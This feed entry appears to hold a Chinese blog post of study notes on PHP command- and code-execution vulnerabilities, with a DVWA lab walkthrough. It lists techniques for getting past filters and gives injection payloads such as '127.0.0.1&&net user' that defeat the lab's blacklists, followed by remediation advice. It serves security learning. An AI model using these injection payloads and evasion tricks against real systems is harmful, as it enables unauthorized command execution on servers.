    <content type="html"><![CDATA[<h2 id="代码执行-命令执行漏洞学习笔记-靶场实战"><a href="#代码执行-命令执行漏洞学习笔记-靶场实战" class="headerlink" title="代码执行+命令执行漏洞学习笔记+靶场实战"></a>代码执行+命令执行漏洞学习笔记+靶场实战</h2><h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><h4 id="一、什么是命令执行漏洞"><a href="#一、什么是命令执行漏洞" class="headerlink" title="一、什么是命令执行漏洞"></a>一、什么是命令执行漏洞</h4><h5 id="命令执行漏洞概念："><a href="#命令执行漏洞概念：" class="headerlink" title="命令执行漏洞概念："></a>命令执行漏洞概念：</h5><p>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system，exec，shell_exec等，当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击。</p><h5 id="漏洞危害："><a href="#漏洞危害：" class="headerlink" title="漏洞危害："></a>漏洞危害：</h5><ul><li>继承web服务器程序的权限，去执行系统命令。</li><li>继承web服务器程序的权限，读取文件</li><li>反弹shell</li><li>控制整个网站甚至控制整个服务器</li></ul><p><strong>代码层：</strong>一些商业应用需要执行命令，商业应用的一些核心代码可能封装在二进制文件中，在web应用中通过system函数来调用；</p><p><strong>系统层：</strong>（bash破壳漏洞）如果我们能够控制执行的bash的环境变量，就可以通过破壳漏洞来执行任意代码；</p><p><strong>第三方组件层：</strong>很典型的就是wordpress中，可以选择使用imageMagick这个常用的图片处理组件，对用户上传的图片进行处理，造成命令执行，另外java中的命令执行漏洞（struts2/Elasticsearch等）</p><p><strong>常用的Linux命令总结：</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls cd mkdir rm cp mv touch cat more chmod <span class="builtin-name">find</span> vi du ifconfig<span class="built_in"> ping </span>netstat lsof shutdown uname kill<span class="built_in">..</span>.</span><br></pre></td></tr></table></figure><h5 id="命令执行与代码执行的区别："><a href="#命令执行与代码执行的区别：" class="headerlink" title="命令执行与代码执行的区别："></a>命令执行与代码执行的区别：</h5><p>代码执行是通过调用<strong>服务器网站代码</strong>进行执行，而命令注入则是调用<strong>操作系统命令</strong>进行执行。</p><h5 id="常见的命令执行函数："><a href="#常见的命令执行函数：" class="headerlink" title="常见的命令执行函数："></a>常见的命令执行函数：</h5><ul><li><p><strong>system()</strong></p><img src="QQ截图20200121111755.png" style="zoom: 67%;" /> </li></ul><ul><li><p><strong>passthru()</strong></p><img src="QQ截图20200121111928.png" style="zoom: 67%;" /></li></ul><ul><li><strong>exec()</strong></li></ul>  <img src="QQ截图20200121112035.png" style="zoom:67%;" /><ul><li><strong>shell_exec()</strong></li></ul>  <img src="QQ截图20200121112153.png" style="zoom:67%;" /><ul><li><strong>`反引号</strong></li></ul>  <img src="QQ截图20200121112345.png" style="zoom:67%;" /><ul><li><p><strong>ob_start()</strong></p></li><li><p><strong>popen()</strong></p></li><li><p><strong>proc_oprn()</strong></p></li><li><p>。。。</p></li></ul><h5 id="常见的绕过方法"><a href="#常见的绕过方法" class="headerlink" title="常见的绕过方法"></a>常见的绕过方法</h5><p><strong>1.空格过滤绕过</strong></p><p>空格可以用以下字符替换</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;    &lt;&gt;   %20(space)   %09(tab)  $IFS$9  $&#123;IFS&#125;  $IFS等</span><br></pre></td></tr></table></figure><p>  测试：</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200121121710.png" alt=""></p><p>2.<strong>命令分隔符</strong></p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">linux:%0a、%0d、;、&amp;、|、&amp;&amp;、||、</span><br><span class="line"><span class="keyword">window</span>: %0a、&amp;、|、%1a、</span><br></pre></td></tr></table></figure><img src="QQ截图20200121121840.png" style="zoom:67%;" /><p><strong>%0a符号：</strong>换行符                 <strong>%0d符号：</strong>回车符             <strong><code>;</code>符号：</strong>起连续指令的功能        </p><p><strong>&amp;  &amp;&amp; ||的区别</strong></p><p>（1）&amp; 表示先执行CMD1 再执行CMD2，这里不考虑CMD1是否成功。使用CMD1 &amp; CMD2</p><p>（2）&amp;&amp; 表示先执行CMD1，成功后再执行CMD，否则不执行CMD2。使用CMD1 &amp;&amp; CMD2</p><p>（3）|| 先执行CMD1，CMD1执行成功就不再执行CMD2，CMD1执行失败则执行CMD2。使用CMD1 || CMD2</p><p>3.<strong>敏感字符绕过</strong></p><ul><li><p>利用变量绕过</p><img src="QQ截图20200121122131.png" style="zoom:67%;" /></li><li><p>利用base64编码绕过</p><img src="QQ截图20200121122557.png" style="zoom:67%;" /></li></ul><h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>1.能使用脚本解决的工作，不要调用其他程序处理，尽量少用执行命令的函数，并在disable_functions中禁用</p><ol start="2"><li>在进入命令执行的函数或方法之前，对参数进行过滤。</li><li>参数的值尽量使用引号包裹，并在拼接前调用addslashes进行转义。</li></ol><h4 id="DVWA-命令注入部分"><a href="#DVWA-命令注入部分" class="headerlink" title="DVWA (命令注入部分)"></a>DVWA (命令注入部分)</h4><h5 id="simple"><a href="#simple" class="headerlink" title="simple"></a>simple</h5><p>由源码可知，要求我们输入ip地址，未进行任何过滤，我们在ip地址后使用&amp;&amp;拼接想要执行的命令。</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127.0.0.1</span>&amp;&amp;net user</span><br></pre></td></tr></table></figure><h5 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ]  ) ) &#123; </span></span><br><span class="line"><span class="php">    <span class="comment">// Get input </span></span></span><br><span class="line"><span class="php">    $target = $_REQUEST[ <span class="string">'ip'</span> ]; </span></span><br><span class="line"><span class="php">    <span class="comment">// Set blacklist </span></span></span><br><span class="line"><span class="php">    $substitutions = <span class="keyword">array</span>( </span></span><br><span class="line"><span class="php">        <span class="string">'&amp;&amp;'</span> =&gt; <span class="string">''</span>, </span></span><br><span class="line"><span class="php">        <span class="string">';'</span>  =&gt; <span class="string">''</span>, </span></span><br><span class="line"><span class="php">    ); </span></span><br><span class="line"><span class="php">    <span class="comment">// Remove any of the charactars in the array (blacklist). </span></span></span><br><span class="line"><span class="php">    $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); </span></span><br><span class="line"><span class="php">    <span class="comment">// Determine OS and execute the ping command. </span></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123; </span></span><br><span class="line"><span class="php">        <span class="comment">// Windows </span></span></span><br><span class="line"><span class="php">        $cmd = shell_exec( <span class="string">'ping  '</span> . $target ); </span></span><br><span class="line"><span class="php">    &#125; </span></span><br><span class="line"><span class="php">    <span class="keyword">else</span> &#123; </span></span><br><span class="line"><span class="php">        <span class="comment">// *nix </span></span></span><br><span class="line"><span class="php">        $cmd = shell_exec( <span class="string">'ping  -c 4 '</span> . $target ); </span></span><br><span class="line"><span class="php">    &#125; </span></span><br><span class="line"><span class="php">    <span class="comment">// Feedback for the end user </span></span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>; </span></span><br><span class="line"><span class="php">&#125; </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p><strong>这里把&amp;&amp;过滤了。。但是我可以使用一个&amp;来绕过。。127.0.0.1&amp;net user</strong></p><p><strong>当然也可以使用 ||  |效果相同</strong></p><h5 id="high"><a href="#high" class="headerlink" title="high:"></a>high:</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ]  ) ) &#123; </span></span><br><span class="line"><span class="php">    <span class="comment">// Get input </span></span></span><br><span class="line"><span class="php">    $target = trim($_REQUEST[ <span class="string">'ip'</span> ]); </span></span><br><span class="line"><span class="php">    <span class="comment">// Set blacklist </span></span></span><br><span class="line"><span class="php">    $substitutions = <span class="keyword">array</span>( </span></span><br><span class="line"><span class="php">        <span class="string">'&amp;'</span>  =&gt; <span class="string">''</span>, </span></span><br><span class="line"><span class="php">        <span class="string">';'</span>  =&gt; <span class="string">''</span>, </span></span><br><span class="line"><span class="php">        <span class="string">'|  '</span> =&gt; <span class="string">''</span>, </span></span><br><span class="line"><span class="php">        <span class="string">'-'</span>  =&gt; <span class="string">''</span>, </span></span><br><span class="line"><span class="php">        <span class="string">'$'</span>  =&gt; <span class="string">''</span>, </span></span><br><span class="line"><span class="php">        <span class="string">'('</span>  =&gt; <span class="string">''</span>, </span></span><br><span class="line"><span class="php">        <span class="string">')'</span>  =&gt; <span class="string">''</span>, </span></span><br><span class="line"><span class="php">        <span class="string">'`'</span>  =&gt; <span class="string">''</span>, </span></span><br><span class="line"><span class="php">        <span class="string">'||'</span> =&gt; <span class="string">''</span>, </span></span><br><span class="line"><span class="php">    ); </span></span><br><span class="line"><span class="php">    <span class="comment">// Remove any of the charactars in the array (blacklist). </span></span></span><br><span class="line"><span class="php">    $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); </span></span><br><span class="line"><span class="php">    <span class="comment">// Determine OS and execute the ping command. </span></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123; </span></span><br><span class="line"><span class="php">        <span class="comment">// Windows </span></span></span><br><span class="line"><span class="php">        $cmd = shell_exec( <span class="string">'ping  '</span> . $target ); </span></span><br><span class="line"><span class="php">    &#125; </span></span><br><span class="line"><span class="php">    <span class="keyword">else</span> &#123; </span></span><br><span class="line"><span class="php">        <span class="comment">// *nix </span></span></span><br><span class="line"><span class="php">        $cmd = shell_exec( <span class="string">'ping  -c 4 '</span> . $target ); </span></span><br><span class="line"><span class="php">    &#125; </span></span><br><span class="line"><span class="php">    <span class="comment">// Feedback for the end user </span></span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>; </span></span><br><span class="line"><span class="php">&#125; </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>还是黑名单。。。，发现|符号还是可以使用   所以     <code>127.0.0.1| net user</code> 成功</p><h3 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h3><h5 id="什么是代码执行漏洞？"><a href="#什么是代码执行漏洞？" class="headerlink" title="什么是代码执行漏洞？"></a>什么是代码执行漏洞？</h5><p>   当应用在调用一些能够将字符转化为代码的函数（如PHP中的eval)时，没有考虑用户是否能控制这个字符串，这就会造成代码执行漏洞。</p><h5 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h5><p>PHP:eval()    assert()、  preg_replace() 、 call_user_func() 、  array_map() </p><p>Python:exec</p><p>asp：&lt;%=CreateObject(“wscript.shell”).exec(“cmd.exe /c ipconfig”).StdOut.ReadAll()%&gt;</p><h5 id="漏洞危害：-1"><a href="#漏洞危害：-1" class="headerlink" title="漏洞危害："></a>漏洞危害：</h5><ul><li>执行代码</li><li>让网站写shell</li><li>甚至控制服务器</li></ul><h5 id="常见种类"><a href="#常见种类" class="headerlink" title="常见种类"></a>常见种类</h5><ul><li>代码执行函数</li><li>文件包含代码注入</li><li>正则表达代码注入</li><li>动态代码执行</li><li>其他</li></ul><h5 id="漏洞分类："><a href="#漏洞分类：" class="headerlink" title="漏洞分类："></a>漏洞分类：</h5><p>执行代码的函数：eval、assert</p><p>callback函数：preg_replace + /e模式</p><p>反序列化：unserialize()反序列化</p><h5 id="示例一：php-eval代码执行"><a href="#示例一：php-eval代码执行" class="headerlink" title="示例一：php eval代码执行"></a>示例一：php eval代码执行</h5><p>本地新建test.php</p><img src="QQ截图20200124110825.png" style="zoom:67%;" /><p>我们本地网址执行phpinfo()</p><img src="QQ截图20200124111032.png" style="zoom:67%;" /><h5 id="示例二：-eval闭合代码执行"><a href="#示例二：-eval闭合代码执行" class="headerlink" title="示例二：  eval闭合代码执行"></a>示例二：  eval闭合代码执行</h5><img src="QQ截图20200124111354.png" style="zoom: 80%;" /><p><img src="QQ%E6%88%AA%E5%9B%BE20200124111639.png" alt=""></p><h4 id="安全防御"><a href="#安全防御" class="headerlink" title="安全防御"></a>安全防御</h4><ol><li>尝试对所有输入提交可能执行命令的构造语句进行严格的检查或者控制外部输入，系统命令执行函数禁止外部传参</li><li>验证数据类型、格式、长度、范围和内容</li><li>客户端与服务端都需要做验证与过滤</li><li>对输出的数据也要做安全检查</li><li>在进入命令执行的函数或方法之前，对参数进行过滤</li><li>参数的值尽量使用引号包裹，并在拼接前调用addslashes进行转义</li><li>能使用脚本解决的工作，不要调用其他程序处理，尽量少用执行命令的函数，并在disabl_functions中禁用</li></ol><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://www.jianshu.com/p/f36e96955b87" target="_blank" rel="noopener">https://www.jianshu.com/p/f36e96955b87</a></p><p><a href="https://www.freebuf.com/column/154670.html" target="_blank" rel="noopener">https://www.freebuf.com/column/154670.html</a></p><p><a href="https://wh0ale.github.io/2018/12/01/2018-12-01-命令执行/" target="_blank" rel="noopener">https://wh0ale.github.io/2018/12/01/2018-12-01-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;代码执行-命令执行漏洞学习笔记-靶场实战&quot;&gt;&lt;a href=&quot;#代码执行-命令执行漏洞学习笔记-靶场实战&quot; class=&quot;headerlink&quot; title=&quot;代码执行+命令执行漏洞学习笔记+靶场实战&quot;&gt;&lt;/a&gt;代码执行+命令执行漏洞学习笔记+靶场实战&lt;/h2&gt;&lt;
      
    
    </summary>
    
    
      <category term="web漏洞学习" scheme="https://shu1l.github.io/categories/web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="代码执行/命令执行" scheme="https://shu1l.github.io/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
</feed>
